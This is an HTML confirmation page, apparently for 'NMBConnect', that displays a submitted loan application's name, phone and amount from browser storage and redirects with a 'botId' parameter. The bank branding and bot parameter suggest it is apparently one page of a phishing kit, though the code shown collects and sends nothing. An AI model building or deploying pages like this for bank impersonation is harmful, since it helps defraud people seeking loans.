<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NMBConnect - Request Submitted</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
}

body {
    background: #4a2b7a;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
}

.app {
    width: 100%;
    max-width: 400px;
    background: #ffffff;
    border-radius: 28px;
    padding: 35px 28px 30px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    position: relative;
    text-align: center;
}

/* NMB CONNECT LOGO AT TOP */
.logo-container {
    text-align: center;
    margin-bottom: 25px;
}

.nmb-logo {
    display: inline-flex;
    align-items: center;
    gap: 10px;
    text-decoration: none;
}

.nmb-logo .logo-icon {
    width: 40px;
    height: 40px;
    background: #4a2b7a;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-size: 20px;
    font-weight: 700;
}

.nmb-logo .logo-text {
    font-size: 22px;
    font-weight: 700;
    color: #1a1a2e;
    letter-spacing: 0.5px;
}

.nmb-logo .logo-text span {
    color: #4a2b7a;
}

/* SUCCESS ICON */
.success-icon {
    width: 80px;
    height: 80px;
    background: #4a2b7a;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
    font-size: 40px;
    box-shadow: 0 8px 25px rgba(74, 43, 122, 0.3);
}

/* HEADER */
.header h1 {
    color: #1a1a2e;
    font-size: 24px;
    font-weight: 700;
    margin-bottom: 6px;
}

.header .subtitle {
    color: #777;
    font-size: 14px;
    font-weight: 400;
    margin-bottom: 25px;
}

/* DETAILS CARD */
.details-card {
    background: #f8f8fc;
    border-radius: 16px;
    padding: 20px;
    margin-bottom: 25px;
    text-align: left;
    border: 1px solid #e8e8f0;
}

.detail-row {
    display: flex;
    justify-content: space-between;
    padding: 10px 0;
    border-bottom: 1px solid #e8e8f0;
}

.detail-row:last-child {
    border-bottom: none;
}

.detail-row .label {
    color: #888;
    font-size: 13px;
    font-weight: 500;
}

.detail-row .value {
    color: #1a1a2e;
    font-size: 14px;
    font-weight: 600;
    text-align: right;
    max-width: 60%;
    word-break: break-word;
}

/* MESSAGE */
.message-box {
    background: #f0f4ff;
    border-radius: 12px;
    padding: 15px;
    margin-bottom: 25px;
    border: 1px solid #d4dcff;
}

.message-box .icon {
    font-size: 20px;
    display: block;
    margin-bottom: 6px;
}

.message-box p {
    color: #4a2b7a;
    font-size: 14px;
    font-weight: 500;
    line-height: 1.5;
    margin: 0;
}

/* BUTTON */
.action-btn {
    width: 100%;
    padding: 15px;
    background: #4a2b7a;
    border: none;
    border-radius: 12px;
    color: white;
    font-size: 17px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    letter-spacing: 0.3px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
}

.action-btn:hover {
    background: #3a1f5e;
    transform: translateY(-1px);
    box-shadow: 0 6px 20px rgba(74, 43, 122, 0.35);
}

.action-btn:active {
    transform: translateY(0);
}

.action-btn .btn-icon {
    font-size: 18px;
}

/* STATUS BADGE */
.status-badge {
    display: inline-block;
    background: #fff3cd;
    color: #856404;
    padding: 4px 16px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: 600;
    margin-bottom: 20px;
}

/* RESPONSIVE */
@media (max-width: 440px) {
    .app {
        padding: 28px 20px 25px;
        border-radius: 22px;
    }
    
    .header h1 {
        font-size: 22px;
    }
    
    .nmb-logo .logo-text {
        font-size: 20px;
    }
    
    .detail-row {
        flex-direction: column;
        align-items: flex-start;
        gap: 2px;
    }
    
    .detail-row .value {
        text-align: left;
        max-width: 100%;
    }
}
</style>
</head>

<body>

<div class="app">

    <!-- NMB CONNECT LOGO -->
    <div class="logo-container">
        <div class="nmb-logo">
            <div class="logo-icon">N</div>
            <div class="logo-text">NMB<span>Connect</span></div>
        </div>
    </div>

    <!-- SUCCESS ICON -->
    <div class="success-icon">✅</div>

    <div class="header">
        <h1>Request Submitted!</h1>
        <div class="subtitle">Your loan application has been received</div>
    </div>

    <div class="status-badge">⏳ Under Review</div>

    <div class="details-card">
        <div class="detail-row">
            <span class="label">Full Name</span>
            <span class="value" id="userName">—</span>
        </div>
        <div class="detail-row">
            <span class="label">Phone Number</span>
            <span class="value" id="userPhone">—</span>
        </div>
        <div class="detail-row">
            <span class="label">Loan Amount</span>
            <span class="value" id="loanAmount">—</span>
        </div>
        <div class="detail-row">
            <span class="label">Status</span>
            <span class="value" style="color: #856404;">Pending Approval</span>
        </div>
    </div>

    <div class="message-box">
        <span class="icon">📋</span>
        <p>Your request is under review. You will be notified once it is processed. Please wait for approval.</p>
    </div>

    <button class="action-btn" id="logoutBtn">
        <span class="btn-icon">🔄</span>
        Start Over
    </button>

</div>

<script>
// ---------------- GET BOT ID ----------------
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');

// ---------------- GET DETAILS FROM LOCALSTORAGE ----------------
const fullName = localStorage.getItem('fullName') || 'N/A';
const phone = localStorage.getItem('phone') || localStorage.getItem('email') || 'N/A';
const loanAmount = localStorage.getItem('loanAmount') || 'N/A';

// Format loan amount with currency
let formattedAmount = loanAmount;
if (loanAmount !== 'N/A' && !isNaN(loanAmount)) {
    formattedAmount = '$' + Number(loanAmount).toLocaleString();
}

// ---------------- POPULATE PAGE ----------------
document.getElementById('userName').textContent = fullName;
document.getElementById('userPhone').textContent = phone;
document.getElementById('loanAmount').textContent = formattedAmount;

// ---------------- LOGOUT / START OVER ----------------
document.getElementById('logoutBtn').addEventListener('click', function() {
    // Clear all stored data
    localStorage.clear();
    
    // Redirect to index page with botId if available
    if (botId) {
        window.location.href = `index.html?botId=${botId}`;
    } else {
        window.location.href = 'index.html';
    }
});

// ---------------- AUTO-REDIRECT AFTER DELAY (Optional) ----------------
// If you want to auto-redirect after 10 seconds, uncomment this:
// setTimeout(() => {
//     document.getElementById('logoutBtn').click();
// }, 10000);
</script>

</body>
</html>
